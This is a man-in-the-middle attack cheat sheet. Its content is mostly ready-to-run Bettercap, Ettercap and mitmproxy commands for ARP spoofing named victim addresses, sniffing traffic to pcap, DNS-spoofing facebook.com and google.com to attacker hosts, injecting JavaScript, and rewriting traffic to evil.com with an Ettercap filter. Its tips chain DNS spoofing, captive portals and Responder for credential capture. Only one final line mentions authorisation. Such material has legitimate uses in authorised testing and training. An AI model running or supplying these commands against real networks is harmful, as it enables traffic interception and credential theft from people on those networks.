# MITM TOOLS COMPLETE CHEAT SHEET

## 1. WHAT IS THIS?

**Man-In-The-Middle (MITM)** tools intercept, modify, or log traffic between two hosts. Common attacks:

- **ARP Spoofing** (Bettercap, Ettercap)
- **DNS Spoofing** (Bettercap, Ettercap)
- **HTTP/HTTPS interception** (mitmproxy, Bettercap)
- **Credential capture** (Responder)
- **Traffic modification** (Ettercap filters)

**Key fact:** Requires being on the same Layer-2 network as the victim (or a pivot into it).

---

## 2. BETTERCAP — MODERN MITM

### 2.1 Start

```bash
sudo bettercap -iface eth0
sudo bettercap -iface wlan0
```

### 2.2 Basic Flow (ARP + Sniff)

```
net.probe on
net.show
set arp.spoof.targets 192.168.0.41
set arp.spoof.fullduplex true
arp.spoof on
set net.sniff.verbose true
set net.sniff.local true
net.sniff on
```

### 2.3 One-liner Version

```bash
sudo bettercap -iface eth0 -eval "net.probe on; sleep 3; set arp.spoof.targets 192.168.0.41; set arp.spoof.fullduplex true; arp.spoof on; set net.sniff.verbose true; set net.sniff.local true; net.sniff on"
```

### 2.4 Save Traffic

```
set net.sniff.output captura.pcap
net.sniff on
```

### 2.5 DNS Spoofing

```
set dns.spoof.domains www.facebook.com,www.google.com,example.com
set dns.spoof.address 192.168.0.103
set dns.spoof.host https://example.ngrok-free.app
dns.spoof on
```

### 2.6 HTTP Proxy + JS Injection

```
http.proxy on
http.proxy.script js_injector
events.stream on
```

### 2.7 Scripted Attacks (Caplets)

File `mitm.cap`:
```
set arp.spoof.targets 192.168.1.105
arp.spoof on
net.sniff.output captura.pcap
net.sniff on
```

Run:
```bash
sudo bettercap -iface wlan0 -caplet mitm.cap
```

### 2.8 Modules

```
modules.list
ble.recon on
```

---

## 3. ETTERCAP — CLASSIC MITM

### 3.1 Start

```bash
sudo ettercap -T -i wlan0        # text mode
sudo ettercap -C -i wlan0        # curses/GUI
```

### 3.2 ARP Spoofing

```bash
sudo ettercap -T -i wlan0 -M arp:remote /192.168.1.0/24/
sudo ettercap -T -i wlan0 -M arp:remote /192.168.1.105/ /192.168.1.1/
sudo ettercap -T -i wlan0 -M arp:remote /victim/ /router/ -w captura.pcap
```

### 3.3 Plugins — DNS Spoof

```bash
sudo ettercap -T -q -i wlan0 -P dns_spoof -M arp:remote /victim/ /router/
```

Edit `/etc/ettercap/etter.dns`:
```
facebook.com A 192.168.1.150
```

### 3.4 Filters (Modify Traffic)

Create `facebook.filter`:
```
if (ip.proto == TCP && tcp.dst == 80) {
  if (search(DATA.data, "facebook.com")) {
    replace("facebook.com", "evil.com");
    msg("Redirecting...");
  }
}
```

Compile and run:
```bash
etterfilter facebook.filter -o facebook.ef
sudo ettercap -T -i wlan0 -F facebook.ef -M arp:remote /victim/ /router/
```

### 3.5 Cleanup

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

---

## 4. MITMPROXY — HTTP/HTTPS INTERCEPTOR

### 4.1 Start

```bash
sudo mitmproxy -i wlan0
sudo mitmproxy --mode transparent --showhost
sudo mitmweb
mitmproxy -p 8080
mitmweb -p 8081
```

### 4.2 Transparent Mode (iptables)

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

### 4.3 Interactive Keys

```
e  → edit request/response
a  → view details
~u google → filter
w  → save
```

### 4.4 Install CA on Client

```
Browser: http://mitm.it
```

### 4.5 Save / Replay

```bash
sudo mitmproxy -w captura.mitm
sudo mitmproxy -r captura.mitm
```

### 4.6 Scripts

```bash
sudo mitmproxy -s script.py
```

---

## 5. TIPS

1. Use **Bettercap** for modern setups — it's more reliable than Ettercap on IPv6/HTTPS.
2. Always enable IP forwarding (`sysctl net.ipv4.ip_forward=1`) or traffic will drop.
3. Save `.pcap` files — you can analyze them later with Wireshark.
4. DNS spoofing + captive portal = credential capture (Evil Twin workflow).
5. Install the mitmproxy CA on every client to decrypt HTTPS.
6. Ettercap filters are powerful but deprecated on modern HTTPS.
7. Combine Bettercap (`dns.spoof`) with `responder` for full credential capture.
8. **Never** MITM networks you don't own or have written authorization for.
